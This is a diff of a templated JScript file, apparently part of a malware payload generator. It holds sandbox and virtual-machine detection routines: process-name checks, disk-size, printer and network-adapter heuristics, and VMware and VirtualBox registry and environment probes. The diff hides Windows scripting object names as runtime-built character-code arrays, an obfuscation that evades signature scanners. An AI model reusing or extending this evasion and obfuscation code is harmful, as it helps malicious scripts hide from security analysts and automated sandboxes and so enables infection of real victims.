@@ -29,7 +29,7 @@ function {{ v.fn_etw }}() {
 
 function {{ v.fn_sandbox }}() {
     try {
-        var wmi = GetObject("winmgmts:");
+        var wmi = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
         var bad = ["vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe","qemu-ga.exe","prl_tools.exe","xenservice.exe","sandboxiedcomlaunch.exe","vmusrvc.exe"];
         var pq  = wmi.ExecQuery("SELECT Name FROM Win32_Process");
         for (var e = new Enumerator(pq); !e.atEnd(); e.moveNext()) {
@@ -42,36 +42,36 @@ function {{ v.fn_sandbox }}() {
         }
     } catch(e) {}
     try {
-        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var fso = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_fs_obj }}]));
         var drv = fso.GetDrive("C:");
         if (drv.TotalSize < 53687091200) return true;
     } catch(e) {}
     try {
-        var sh = new ActiveXObject("WScript.Shell");
+        var sh = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
         sh.RegRead({{ v.fn_build_str }}([72,75,76,77,92,83,79,70,84,87,65,82,69,92,86,77,119,97,114,101,44,32,73,110,99,46,92,86,77,119,97,114,101,32,84,111,111,108,115,92,73,110,115,116,97,108,108,80,97,116,104]));
         return true;
     } catch(e) {}
     try {
-        var sh2 = new ActiveXObject("WScript.Shell");
+        var sh2 = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
         sh2.RegRead({{ v.fn_build_str }}([72,75,76,77,92,83,79,70,84,87,65,82,69,92,79,114,97,99,108,101,92,86,105,114,116,117,97,108,66,111,120,32,71,117,101,115,116,32,65,100,100,105,116,105,111,110,115,92,86,101,114,115,105,111,110]));
         return true;
     } catch(e) {}
     try {
-        var wmi2 = GetObject("winmgmts:");
+        var wmi2 = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
         var prq = wmi2.ExecQuery("SELECT Name FROM Win32_Printer");
         var pc = 0;
         for (var ep = new Enumerator(prq); !ep.atEnd(); ep.moveNext()) pc++;
         if (pc === 0) return true;
     } catch(e) {}
     try {
-        var wmi3 = GetObject("winmgmts:");
+        var wmi3 = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
         var naq = wmi3.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL");
         var nac = 0;
         for (var ena = new Enumerator(naq); !ena.atEnd(); ena.moveNext()) nac++;
         if (nac < 2) return true;
     } catch(e) {}
     try {
-        var _env = new ActiveXObject("WScript.Shell").Environment("Process");
+        var _env = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}])).Environment("Process");
         if (_env("VBOX_VERSION") !== "") return true;
         if (_env("SANDBOXIE_HOME") !== "") return true;
     } catch(e) {}
